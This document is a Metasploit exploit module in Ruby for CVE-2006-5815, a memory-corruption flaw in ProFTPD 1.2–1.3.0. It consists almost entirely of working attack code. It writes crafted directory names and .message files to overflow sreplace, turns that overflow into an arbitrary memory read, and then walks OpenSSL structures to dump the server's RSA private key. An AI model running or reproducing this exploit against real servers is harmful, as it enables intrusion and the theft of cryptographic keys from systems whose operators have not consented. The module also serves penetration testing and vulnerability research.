##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in versions 1.2 through
        1.3.0 of ProFTPD server. The vulnerability is within the "sreplace" function
        within the "src/support.c" file.

        The off-by-one heap overflow bug in the ProFTPD sreplace function has been
        discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit
        this off-by-one bug via MKD command, but failed. We did not work on this bug
        since then.

        Actually, there are exists at least two bugs in sreplace function, one is the
        mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow
        via 'sstrncpy(dst,src,negative argument)'.

        We were unable to reach the "sreplace" stack bug on ProFTPD 1.2.10 stable
        version, but the version 1.3.0rc3 introduced some interesting changes, among them:

        1. another (integer) overflow in sreplace!
        2. now it is possible to reach sreplace stack-based buffer overflow bug via
          the "pr_display_file" function!
        3. stupid '.message' file display bug

        So we decided to choose ProFTPD 1.3.0 as a target for our exploit.
        To reach the bug, you need to upload a specially created .message file to a
        writeable directory, then do "CWD <writeable directory>" to trigger the invocation
        of sreplace function.

        Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message'
        file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug.

        The exploit is a part of VulnDisco Pack since Dec 2005.
      },
      'Author'         =>
        [
          'Evgeny Legerov <admin[at]gleg.net>',  # original .pm version (VulnDisco)
          'jduck'   # Metasploit 3.x port
        ],
      'References'     =>
        [
          [ 'CVE', '2006-5815' ],
          [ 'OSVDB', '68985' ],
          [ 'BID', '20992' ],
          [ 'URL', 'http://seclists.org/bugtraq/2006/Nov/94' ],
          [ 'URL', 'http://seclists.org/bugtraq/2006/Nov/538' ],
          [ 'URL', 'http://bugs.proftpd.org/show_bug.cgi?id=2858' ],
          [ 'URL', 'http://proftp.cvs.sourceforge.net/proftp/proftpd/src/main.c?view=diff&r1=text&tr1=1.292&r2=text&tr2=1.294&diff_format=h' ]
        ],
      'Targets'        =>
        [
          ['Default', { } ]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => true,
      'Platform'       => [ 'linux' ],
      'DisclosureDate' => 'Nov 26 2006'))

    register_options(
      [
        OptString.new('NON_EMPTY_HIGH', [ true, 'Address of a non empty string in the stack/library region', '0x08048001' ]),
      ], self.class )

    # a writable directory (needs to be '/')
    @WRITABLE = '/'

    # Address of an empty string
    @EMPTY = 0x0804b3b9

    # Address of the mons global variable
    # 080dc6c0 <mons.8475>:
    @MONS_ADDR = 0x080dc6c0

    # We need a global variable whose value is also a global pointer
    # (that is, a 0x80... value stored at an 0x80... address)
    # 080e0400 <auth_unix_module>:
    #         ...
    #  80e0408:       20 00                   and    %al,(%eax)
    #  80e040a:       00 00                   add    %al,(%eax)
    #  80e040c:       a3 76 0c 08 30          mov    %eax,0x30080c76
    #  80e0411:       04 0e                   add    $0xe,%al
    #  80e0413:       08 00                   or     %al,(%eax)
    @G_PTR_ADDR = 0x80e0410
    @G_PTR = 0x080e0430


    # Address of the ssl_ctx variable
    # 080eb0a8 <ssl_ctx>:
    @SSL_CTX = 0x80eb0a8
 
  end


  def check
    # NOTE: We don't care if the login failed here...
    ret = connect

    # We just want the banner to check against our targets..
    vprint_status("FTP Banner: #{banner.strip}")

    status = CheckCode::Safe

    if banner =~ /ProFTPD (1\.[23]\.[^ ])/i
      ver = $1
      maj,min,rel = ver.split('.')
      relv = rel.slice!(0,1)
      case relv
      when '2'
        status = CheckCode::Appears

      when '3'
        # 1.3.x before 1.3.1 is vulnerable
        status = CheckCode::Appears
        if rel.length > 0
          if rel.to_i > 0
            status = CheckCode::Safe
          else
            status = CheckCode::Appears
          end
        end
      end
    end

    disconnect
    return status
  end

  def check_number_has(x, b)
    for i in 0..3
      if ((x >> (i * 8)) & 0xff) == b
        return true
      end
    end

    return false
  end

  def try_split(x)
    l = []
    for i in 1..0xe
      l << (0x11111111 * i)
    end

    l.each { |a|
      b = x - a
      if not check_number_has(b, 0x0) and not check_number_has(b, 0xa) and not check_number_has(b, 0xff)
        return a, b
      end
    }

    fail_with(Failure::Unknown, "Couldn't split %x" % x)
  end

  def read(addr)
    res = send_cmd(['CWD', @WRITABLE])

    pwd = send_cmd(['PWD'])
    if pwd !~ /257\s\"(.+)\"/
      fail_with(Failure::Unknown, "Unable to get current working directory")
    end
    pwd = $1
    pwd << "/" if pwd[-1,1] != "/"

    #rarr[1] = addr
    dir1 = "\x80\x04\x08" + [addr].pack('V') + 'E'*(90 - pwd.length - 3 - 4)

    send_cmd(['MKD', dir1])

    send_cmd(['CWD', dir1])

    send_cmd(['PWD'])

    dir2 = "B" * 233

    dst = @G_PTR

    a, b = try_split(dst)
    #puts "split %x %x %x" % [dst, a, b]

    #cp + rlen = dest
    #cp
    dir2[221..224] = [a].pack('V')
    #rlen
    dir2[185..188] = [b].pack('V')

    non_empty = datastore['NON_EMPTY_HIGH'].to_i(16)
    a, b = try_split(non_empty + 1)
    #puts "split %x %x %x" % [non_empty + 1, a, b]

    #src + mlen = empty_str
    #mlen
    dir2[205..208] = [a].pack('V')
    #src
    dir2[225..228] = [b].pack('V')

    blen = dst - non_empty + 5
    if check_number_has(blen, 0x0) or check_number_has(blen, 0xa) or check_number_has(blen, 0xff)
      fail_with(Failure::Unknown, "%x and %x are not compatible." % [dst, non_empty])
    end

    #pbuf
    dir2[209..212] = [non_empty].pack('V')

    #blen
    dir2[201..204] = [blen].pack('V')

    #marr[0]
    dir2[41..44] = [datastore['NON_EMPTY_HIGH'].to_i(16)].pack('V')

    #marr[1]
    dir2[45..48] = [@EMPTY].pack('V')

    #mptr
    dir2[217..220] = [datastore['NON_EMPTY_HIGH'].to_i(16)].pack('V')

    send_cmd(['DELE', "#{dir2}/AA/.message"])
    send_cmd(['RMD', "#{dir2}/AA"])
    send_cmd(['DELE', "#{dir2}/.message"])
    send_cmd(['RMD', dir2])

    filedata = "\x25C" * 12 + 'C' * 300 + "\x25C" * 40

    res = send_cmd(['MKD', dir2])
    res = send_cmd_data(['PUT', "#{dir2}/.message"], filedata, 'I')

    # Trigger sreplace overflow
    res = send_cmd(['CWD', dir2])

    res = send_cmd(['MKD', 'AA'])
    send_cmd_data(['PUT', "AA/.message"], "\x25T", 'I')

    send_cmd(['CWD', 'AA'], recv=false)

    res = self.sock.get()
    #send_cmd(['CWD', 'AA'])
    return res
  end

  def copy(dst, src)
    res = send_cmd(['CWD', @WRITABLE])

    pwd = send_cmd(['PWD'])
    if pwd !~ /257\s\"(.+)\"/
      fail_with(Failure::Unknown, "Unable to get current working directory")
    end
    pwd = $1
    pwd << "/" if pwd[-1,1] != "/"

    #rarr[1] = addr
    dir1 = "\x80\x04\x08" + [src].pack('V') + 'E'*(90 - pwd.length - 3 - 4)

    send_cmd(['MKD', dir1])

    send_cmd(['CWD', dir1])

    send_cmd(['PWD'])

    dir2 = "B" * 233

    a, b = try_split(dst)
    #puts "split %x %x %x" % [dst, a, b]

    #cp + rlen = dest
    #cp
    dir2[221..224] = [a].pack('V')
    #rlen
    dir2[185..188] = [b].pack('V')

    non_empty = datastore['NON_EMPTY_HIGH'].to_i(16)
    a, b = try_split(non_empty + 1)
    #puts "split %x %x %x" % [non_empty + 1, a, b]

    #src + mlen = empty_str
    #mlen
    dir2[205..208] = [a].pack('V')
    #src
    dir2[225..228] = [b].pack('V')

    blen = dst - non_empty + 5
    if check_number_has(blen, 0x0) or check_number_has(blen, 0xa) or check_number_has(blen, 0xff)
      fail_with(Failure::Unknown, "%x and %x are not compatible." % [dst, non_empty])
    end

    #pbuf
    dir2[209..212] = [non_empty].pack('V')

    #blen
    dir2[201..204] = [blen].pack('V')

    #marr[0]
    dir2[41..44] = [datastore['NON_EMPTY_HIGH'].to_i(16)].pack('V')

    #marr[1]
    dir2[45..48] = [@EMPTY].pack('V')

    #mptr
    dir2[217..220] = [datastore['NON_EMPTY_HIGH'].to_i(16)].pack('V')

    send_cmd(['DELE', "#{dir2}/.message"])
    send_cmd(['RMD', dir2])

    filedata = "\x25C" * 12 + 'C' * 300 + "\x25C" * 40

    res = send_cmd(['MKD', dir2])
    res = send_cmd_data(['PUT', "#{dir2}/.message"], filedata, 'I')

    # Trigger sreplace overflow
    send_cmd(['CWD', dir2])
  end

  def exploit
    connect_login

    # in the following for loop, not only mons[] array is changed, but also
    # the days[] which is immediate after mons[]. Fortunately only days[0] 
    # and days[1] are changed, and the new pointers point to "" and "v" 
    # respectively. So we have to patch the length of the output 
    time = Time.now    # Convert number of seconds into Time object.
    result_start = 8
    result_end   = 11
    if time.wday == 0  # Sun
      result_start = 5
      result_end   = 8
    elsif time.wday == 1
      result_start = 6
      result_end   = 9 
    end 

    #puts "attach and press any key"; bleh = $stdin.gets
    for i in 0..11
      copy(@MONS_ADDR + 4 * i, @G_PTR_ADDR)
    end

    ssl_ctx = read(@SSL_CTX)[result_start..result_end].unpack("V")[0]
    puts "ssl_ctx @ %x" % ssl_ctx

    cert = read(ssl_ctx + 0xb0)[result_start..result_end].unpack("V")[0]
    puts "cert @ %x" % cert

    cert_pkey = read(cert + 0)[result_start..result_end].unpack("V")[0]
    puts "cert_pkey @ %x" % cert_pkey

    evp_pkey = read(cert_pkey + 4)[result_start..result_end].unpack("V")[0]
    puts "evp_pkey @ %x" % evp_pkey

    rsa = read(evp_pkey + 0x14)[result_start..result_end].unpack("V")[0]
    puts "rsa @ %x" % rsa

    rsa_d = read(rsa + 0x18)[result_start..result_end].unpack("V")[0]
    puts "rsa_d @ %x" % rsa_d

    rsa_d_arr = read(rsa_d + 0)[result_start..result_end].unpack("V")[0]
    puts "rsa_d_arr @ %x" % rsa_d_arr

    for i in 0..63
      d = read(rsa_d_arr+ i * 4)[result_start..result_end].unpack("H*")[0]
      print d
    end

    puts ""

    disconnect

  end

end